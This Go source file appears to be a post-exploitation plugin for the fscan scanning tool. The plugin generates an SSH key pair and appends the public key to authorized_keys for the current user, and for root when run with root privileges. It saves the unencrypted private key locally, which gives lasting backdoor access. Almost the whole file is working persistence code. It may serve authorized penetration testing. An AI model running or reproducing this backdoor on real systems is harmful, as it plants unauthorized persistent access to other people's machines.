//go:build (plugin_sshkey || !plugin_selective) && !windows && !no_local

package local

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
	"golang.org/x/crypto/ssh"
)

type SSHKeyPlugin struct {
	plugins.BasePlugin
}

func NewSSHKeyPlugin() *SSHKeyPlugin {
	return &SSHKeyPlugin{BasePlugin: plugins.NewBasePlugin("sshkey")}
}

func (p *SSHKeyPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	var output strings.Builder
	var successCount int

	targets := p.getTargetUsers()

	for _, u := range targets {
		sshDir := filepath.Join(u.HomeDir, ".ssh")
		authFile := filepath.Join(sshDir, "authorized_keys")

		if err := os.MkdirAll(sshDir, 0700); err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: 无法创建 .ssh 目录: %v\n", u.Username, err))
			continue
		}

		pubKey, privKey, err := p.generateKeyPair()
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: 密钥生成失败: %v\n", u.Username, err))
			continue
		}

		// 追加公钥到 authorized_keys
		existing, err := os.ReadFile(authFile)
		if err != nil && !os.IsNotExist(err) {
			output.WriteString(fmt.Sprintf("[失败] %s: 读取 authorized_keys 失败: %v\n", u.Username, err))
			continue
		}
		if strings.Contains(string(existing), pubKey) {
			output.WriteString(fmt.Sprintf("[跳过] %s: 公钥已存在\n", u.Username))
			continue
		}

		entry := pubKey + " fscan@" + hostname() + "\n"
		f, err := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: 无法写入 authorized_keys: %v\n", u.Username, err))
			continue
		}
		_, err = f.WriteString(entry)
		f.Close()
		if err != nil {
			continue
		}

		// 保存私钥到当前目录
		keyFile := fmt.Sprintf("id_%s_%s", u.Username, "ed25519")
		if err := os.WriteFile(keyFile, []byte(privKey), 0600); err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: 私钥保存失败: %v\n", u.Username, err))
			continue
		}

		output.WriteString(fmt.Sprintf("[成功] %s: 公钥已注入 %s，私钥保存为 %s\n", u.Username, authFile, keyFile))
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("sshkey_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func (p *SSHKeyPlugin) getTargetUsers() []*user.User {
	var targets []*user.User

	if u, err := user.Current(); err == nil {
		targets = append(targets, u)
	}

	// root 权限下额外注入 root 用户
	if os.Getuid() == 0 {
		if root, err := user.Lookup("root"); err == nil {
			targets = append(targets, root)
		}
	}

	return targets
}

func (p *SSHKeyPlugin) generateKeyPair() (pubKeyStr, privKeyStr string, err error) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return "", "", err
	}

	sshPub, err := ssh.NewPublicKey(pub)
	if err != nil {
		return "", "", err
	}
	pubKeyStr = strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sshPub)))

	privBytes, err := ssh.MarshalPrivateKey(priv, "")
	if err != nil {
		return "", "", err
	}
	privKeyStr = string(pem.EncodeToMemory(privBytes))

	return pubKeyStr, privKeyStr, nil
}

func hostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}

func init() {
	RegisterLocalPlugin("sshkey", func() Plugin {
		return NewSSHKeyPlugin()
	})
}
